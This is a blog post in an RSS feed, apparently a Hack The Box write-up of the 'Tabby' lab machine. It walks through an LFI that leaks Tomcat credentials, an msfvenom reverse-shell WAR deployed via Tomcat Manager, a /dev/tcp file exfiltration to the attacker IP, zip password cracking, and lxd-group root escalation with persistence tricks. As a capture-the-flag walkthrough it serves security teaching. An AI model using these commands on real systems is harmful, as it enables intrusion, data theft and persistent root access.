+      <content:encoded><![CDATA[<p>Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious <code>.war</code> file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Local File Inclusion</li>
+<li>Abusing Tomcat <code>manager-script</code> roles</li>
+<li>Privilege escalation with lxc/lxd group.</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>BurpSuite - <a href="https://portswigger.net/burp">https://portswigger.net/burp</a></li>
+<li>curl - Preinstalled in Kali Linux</li>
+<li>msfvenom - Preinstalled in Kali Linux</li>
+<li>alpine-builder - <a href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds</span>
+</code></pre></div><p>An initial <code>nmap</code> scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting port 80 shows a company website that offers hosting services called &ldquo;Mega Hosting&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/19847b521b1c48b08f57e8e4986fcc06.png" alt="19847b521b1c48b08f57e8e4986fcc06"  /></div>
+</p>
+<p>The domain name of this site is revealed from the email address and also from the page source</p>
+<p><div class="img-container"><img src="imgs/image-20210426220259010.png" alt="image-20210426220259010"  /></div>
+</p>
+<p>I&rsquo;ll add <code>megahosting.htb</code> to <code>/etc/hosts</code> file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.10.194 megahosting.htb
+</code></pre></div><p>The company statement about data breach points to this link <code>http://megahosting.htb/news.php?file=statement</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210426215350459.png" alt="image-20210426215350459"  /></div>
+</p>
+<p>They mentioned a tool, but I have no idea what tool it is.</p>
+<p>I ran gobuster but found nothing really interesting there.</p>
+<h3 id="tcp-8080---tomcat">TCP 8080 - Tomcat</h3>
+<p>Visiting port 8080 shows the Tomcat default page.</p>
+<p><div class="img-container"><img src="imgs/09afc545cd1943dbb578574d338d0943.png" alt="09afc545cd1943dbb578574d338d0943"  /></div>
+</p>
+<p>Both &ldquo;manager webapp&rdquo; and &ldquo;host-manager webapp&rdquo; are asking for credentials. I tried using Tomcat&rsquo;s default credentials, but it didn&rsquo;t work.</p>
+<p><div class="img-container"><img src="imgs/0aedd7409c3444a3bb359bb837b33c93.png" alt="0aedd7409c3444a3bb359bb837b33c93"  /></div>
+</p>
+<p>I&rsquo;ll take note on these:</p>
+<ul>
+<li>/etc/tomcat9/tomcat-users.xml</li>
+<li>&ldquo;tomcat9&rdquo;</li>
+</ul>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-tomcat">Shell as tomcat</h3>
+<h4 id="local-file-inclusion-lfi">Local File Inclusion (LFI)</h4>
+<p>I found out the file parameter on <code>http://megahosting.htb/news.php?file=statement</code> is vulnerable to LFI.</p>
+<blockquote>
+<p>The LFI can be identified by assuming the website is hosted at <code>/var/www/html/megahosting/</code>. So the payload would be ../../../../file/to/read</p>
+</blockquote>
+<p><img src="imgs/42fb887abe344db48a138d3b7707cf5d.png" alt="42fb887abe344db48a138d3b7707cf5d" style="zoom:80%;" /></p>
+<p>But the read access is limited.</p>
+<h4 id="getting-tomcat-credentials">Getting tomcat Credentials</h4>
+<p>According to the Tomcat default page, it says that &ldquo;Users are defined in <code>/etc/tomcat9/tomcat-users.xml</code>&rdquo;, so I tried to leverage the LFI to read that file but it returned with a blank.</p>
+<p><img src="imgs/efc8b8670fa0473085bfd66dad7670f2.png" alt="efc8b8670fa0473085bfd66dad7670f2" style="zoom:80%;" /></p>
+<p>With basic Linux knowledge and service fingerprint from the <code>nmap</code> result, I can search for the exact location of the installed Tomcat.</p>
+<p>First, in Linux, every software application is most likely installed in one of the following directories:</p>
+<ul>
+<li><code>/usr/share/appname</code></li>
+<li><code>/usr/lib/appname</code></li>
+<li><code>/opt/appname</code></li>
+<li><code>/var/lib/appname</code></li>
+</ul>
+<p>Second, according to the <code>nmap</code> result, <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=OpenSSH+8.2p1&amp;searchon=all">OpenSSH version 8.2p1</a> and <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=apache2+2.4.41&amp;searchon=all">Apache version 2.4.41</a>. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the <a href="https://packages.ubuntu.com/search?suite=default&amp;section=all&amp;arch=any&amp;keywords=tomcat9&amp;searchon=all">search</a>, and find the install location of <a href="https://packages.ubuntu.com/focal/all/tomcat9/filelist">Tomcat9 on Ubuntu 20.04</a>.</p>
+<p>The search brought me to this location <code>/usr/share/tomcat9/etc/tomcat-users.xml</code>, and that seems to be the correct location.</p>
+<p><div class="img-container"><img src="imgs/531dc2a899f54b368f3fdadb83623272.png" alt="531dc2a899f54b368f3fdadb83623272"  /></div>
+</p>
+<p>The credentials is <code>tomcat:$3cureP4s5w0rd123!</code></p>
+<h4 id="html-gui---host-manager-webapp">HTML GUI - host-manager-webapp</h4>
+<p>When I tried to access the host-manager-webapp with <em>-not-working-</em> default credentials, the page says something about the roles that concerns me.</p>
+<p><div class="img-container"><img src="imgs/image-20210426232907769.png" alt="image-20210426232907769"  /></div>
+</p>
+<p>Then, based on the <code>tomcat-users.xml</code> file, <code>tomcat</code> has two roles, <code>admin-gui</code> and <code>manager-script</code>. That means the credentials is not authorized on manager-webapp (<code>/manager</code>), but it will work on host-manager-webapp (<code>/host-manager</code>),</p>
+<p><div class="img-container"><img src="imgs/102088bcbb8b46a79a0f333b027bcaa2.png" alt="102088bcbb8b46a79a0f333b027bcaa2"  /></div>
+</p>
+<p>Another interesting one is, if I clicked the Server Status from <code>/host-manager</code> it just redirects me to <code>http://10.10.10.194:8080/manager/status/all</code>, and it doesn&rsquo;t complain about the authorization. The page is seen below</p>
+<p><div class="img-container"><img src="imgs/314b3cdbc1964a699afeb20044dbc792.png" alt="314b3cdbc1964a699afeb20044dbc792"  /></div>
+</p>
+<p>So, I think I can access some features behind <code>/manager/[here]</code>. From the page above, the server accepts JSP/JSPX files.</p>
+<h4 id="text-interface---manager-webapp">Text Interface - manager-webapp</h4>
+<p>The second role of user tomcat is <code>manager-script</code>.</p>
+<p>From <a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">this article</a></p>
+<blockquote>
+<p><code>manager-script</code> provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI</p>
+</blockquote>
+<p>This concludes that I can access some features behind <code>/manager/</code> but not from the GUI, instead it uses text-based. The full documentation of what you can do with this role is available <a href="http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Supported_Manager_Commands">here</a></p>
+<h4 id="deploying-malicious-war">Deploying Malicious WAR</h4>
+<p>With <code>manager-script</code> role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious <code>.war</code> file that is embedded with jsp reverse shell.</p>
+<p>First, I&rsquo;ll craft a <code>.war</code> file payload using <code>msfvenom</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ msfvenom -p java/jsp_shell_reverse_tcp lhost<span style="color:#f92672">=</span>10.10.14.30 lport<span style="color:#f92672">=</span><span style="color:#ae81ff">9000</span> -f war -o iamf.war
+</code></pre></div><p>Then I&rsquo;ll upload the payload using <code>curl</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ curl -u <span style="color:#e6db74">&#39;tomcat:$3cureP4s5w0rd123!&#39;</span> -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path<span style="color:#f92672">=</span>/iamf.war
+</code></pre></div><ul>
+<li>-u : for credential [username:password]</li>
+<li>-T : for transfer file</li>
+</ul>
+<p>I&rsquo;ll setup listener, and then trigger the payload also using <code>curl</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ curl http://10.10.10.194:8080/iamf.war
+</code></pre></div><p>My listener now have a shell.</p>
+<p><div class="img-container"><img src="https://cdn-images-1.medium.com/max/1000/1*TG4UfRosbeX5ncZtEoIVng.png" alt="img"  /></div>
+</p>
+<p>I can upgrade the shell into TTY using this trick.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ script /dev/null; bash
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-ash">Shell as ash</h3>
+<p>Enumeration</p>
+<p>Manual enumeration with the <code>find</code> command discovered a backup file in zip format that is owned by user <code>ash</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ find / -type f -user ash 2&gt;/dev/null | grep -v <span style="color:#e6db74">&#39;proc&#39;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/47eaa7bb176b445fa6a091ac49e5f32f.png" alt="47eaa7bb176b445fa6a091ac49e5f32f"  /></div>
+</p>
+<p>I&rsquo;ll transfer the backup file to my Kali.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip &gt; /dev/tcp/10.10.14.30/9001
+</code></pre></div><p>And receive it on my listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ nc -nvlp <span style="color:#ae81ff">9001</span> &gt; 16162020_backup.zip
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.30<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.194<span style="color:#f92672">]</span> <span style="color:#ae81ff">65056</span>
+</code></pre></div><h4 id="recover-backup-password">Recover Backup Password</h4>
+<p>The backup file is protected by a password. I&rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I&rsquo;ll have to convert it to hash format using <code>zip2john</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ zip2john 16162020_backup.zip &gt; backup.hash
+</code></pre></div><p>The password got cracked instantly.</p>
+<pre><code>john.exe --wordlist=rockyou.txt backup.hash
+</code></pre><p><div class="img-container"><img src="imgs/3538b21b4a734a6981f21967db4e87fa.png" alt="3538b21b4a734a6981f21967db4e87fa"  /></div>
+</p>
+<p>The password is <code>admin@it</code>.</p>
+<h4 id="su---ash">SU - ash</h4>
+<p>It turns out that the backup password is reused by <code>ash</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ su ash
+su ash
+Password: admin@it
+</code></pre></div><p>I&rsquo;ll put my SSH public key to the authorized_keys file on <code>ash</code> home directory for better shell.</p>
+<pre><code>ash@tabby:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=' &gt; authorized_keys
+</code></pre><p>Now I can login with my key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
+$ ssh -i id_rsa ash@10.10.10.194
+ash@tabby:~$                                                                 
+ash@tabby:~$ sudo -l
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> ash:                                                                   
+Sorry, user ash may not run sudo on tabby.
+ash@tabby:~$ id
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="abusing-lxc">Abusing lxc</h4>
+<p>I found out that user <code>ash</code> is a member of the <code>lxd</code> group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.</p>
+<blockquote>
+<p>It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting <code>/</code> (root file system) to the container and interacting with it from inside the container as a privileged user.</p>
+</blockquote>
+<p>I&rsquo;ll use <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">this</a> article as reference.</p>
+<p>First, I’ll create an alpine image on my attacking machine, which is Kali Linux.</p>
+<pre><code>→ root@iamf «tabby» «10.10.14.30»
+$ git clone https://github.com/saghul/lxd-alpine-builder
+
+→ root@iamf «tabby» «10.10.14.30»
+$ cd lxd-alpine-builder
+
+→ root@iamf «tabby» «10.10.14.30»
+$ ./build-alpine
+</code></pre><p><div class="img-container"><img src="imgs/99679b825f584f4aaefa3412876cd211.png" alt="99679b825f584f4aaefa3412876cd211"  /></div>
+</p>
+<p>Once it&rsquo;s done, there will be an image file called <code>alpine-v3.12-x86_64-blablabla</code>. In my case, it is <code>alpine-v3.12-x86_64-20201107_1900.tar.gz</code>. I&rsquo;ll send the image to Tabby via <code>scp</code>.</p>
+<pre><code>→ root@iamf «tabby» «10.10.14.30»
+$ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz  ash@10.10.10.194:/tmp
+</code></pre><p>I&rsquo;ll initialize the lxd (storage pool, profile, etc..).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxd init
+</code></pre></div><p>I&rsquo;ll import the image, and then initialize the image.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img
+ash@tabby:~$
+ash@tabby:~$ lxc init iamf-img img-container -c security.privileged<span style="color:#f92672">=</span>true
+</code></pre></div><p>Next, I&rsquo;ll mount the root file system of the host to the container at <code>/mnt/root</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc config device add img-container iamf-test disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root
+Device iamf-test added to img-container
+</code></pre></div><p>After that, I&rsquo;ll start the container. I can confirm it is running using <code>lxc ls</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc start img-container
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003512685.png" alt="image-20210427003512685"  /></div>
+</p>
+<p>Now I can just interact with the container and grab the root flag on <code>/mnt/root/root/root.txt</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$lxc exec img-container /bin/sh
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003902623.png" alt="image-20210427003902623"  /></div>
+</p>
+<p>Modifications on <code>/mnt/root/</code> will also affect the root file system of the host. Other things I can do from the container is:</p>
+<ul>
+<li>Adding a persistent user via <code>/etc/passwd</code> (<code>/mnt/root/etc/passwd</code>)</li>
+<li>Adding a SUID bash (<code>cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash</code>)</li>
+<li>Enabling root login and put my SSH public key to the root <code>authorized_keys</code> file.</li>
+</ul>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
